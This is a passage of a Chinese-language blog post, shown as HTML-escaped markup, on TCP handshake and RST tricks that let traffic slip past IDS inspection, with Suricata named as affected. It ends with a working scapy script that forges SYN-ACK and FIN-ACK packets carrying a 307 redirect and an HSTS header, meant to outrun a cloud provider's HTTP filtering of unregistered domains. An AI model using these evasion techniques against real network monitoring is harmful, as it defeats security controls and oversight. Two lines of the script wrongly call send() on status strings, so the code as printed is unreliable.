Client    &amp;lt;-  [SYN, ACK] [Seq=0 Ack=1]      &amp;lt;-  Evil Server
# 但是服务器端在握手结束之前就发送了 PSH，里面包含了一些数据
Client    &amp;lt;-  [PSH, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
# 服务器端主动关闭了连接
Client    &amp;lt;-  [FIN, ACK] [Seq=83 Ack=1]     &amp;lt;-  Evil Server
# 三次握手完成
Client    -&amp;gt;  [ACK] [Seq=1 Ack=84]          -&amp;gt;  Evil Server
# 客户端正常的发送数据
Client    -&amp;gt;  [PSH, ACK] [Seq=1 Ack= 4]     -&amp;gt;  Evil Server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Suricata IDS 在 4.0.4 版本之前存在这个问题&lt;/p&gt;

&lt;h2 id=&quot;rst-导致的绕过&quot;&gt;RST 导致的绕过&lt;/h2&gt;

&lt;p&gt;有些 Windows 客户端在收到 RST 包之后，如果紧接着又收到了其他的 TCP 数据，那仍然是可以读取和处理的，有些 IDS 正确处理了这个问题，有的在收到 RST 包之后就停止了检查 TCP 包。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Client starts a TCP 3-way handshake
Client    -&amp;gt;  [SYN] [Seq=0 Ack=0]           -&amp;gt;  Evil Server
# Server responses with TCP RST
Client    &amp;lt;-  [RST, ACK] [Seq=0x0 Ack=1]    &amp;lt;-  Evil Server
# And SYN-ACK shortly after RST
Client    &amp;lt;-  [SYN, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
           ... 三次握手继续 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Suricata IDS（全版本？）存在这个问题。对于 UDP 数据包，也有一个类似的问题。&lt;/p&gt;

&lt;h2 id=&quot;应用&quot;&gt;应用&lt;/h2&gt;

&lt;p&gt;某些云服务器厂商会实时的去过滤每台机器的 HTTP 请求的域名，也就是 Host 字段，一旦发现是没有[[(备)]]案的，就会返回一个拦截页面，怎么绕过这个呢。经过测试发现某云应该是不检测 HTTPS的，如果可以让 80 端口重定向到 443，然后设置 HSTS 头，这样基本长时间内浏览器就不会再访问 80 端口了，虽然 SSL SNI 和 证书中也是含有域名信息的。&lt;/p&gt;

&lt;p&gt;访问 80 端口，发现三次握手是正常进行的，而拦截发生在客户端发送了 HTTP 请求包之后，这也说明，防火墙不是无条件封禁的和屏蔽端口的，而是实时的过滤。如果可以抢在防火墙发包之前发送，那就可以实现重定向了。&lt;/p&gt;

&lt;p&gt;写了一个 Python 的脚本来完成这个事情&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# coding=utf-8&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;SERVER_DOMAIN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;example.me&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SERVER_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4445&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;FIN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SYN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ACK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_synack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 确认 SYN&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MSS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1460&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_finack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    带重定向指令的包
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;FA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MSS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1460&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HTTP/1.1 307 Internal Redirect&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Length: 0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Location: https://&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s:443&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Strict-Transport-Security: max-age=31536000&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SERVER_DOMAIN&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MSS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1460&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 如果是 SYN 就回复 SYN-ACK 和 FIN-ACK&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SYN&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;build_synack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SYN ACK sent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;build_finack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;FIN ACK sent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FIN&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# 如果不 ACK，客户端可能一直重传&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;build_ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ACK sent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 对于 TCP 和 SERVER PORT 端口的包，回调 handle_packet 函数&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tcp and port &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SERVER_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handle_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

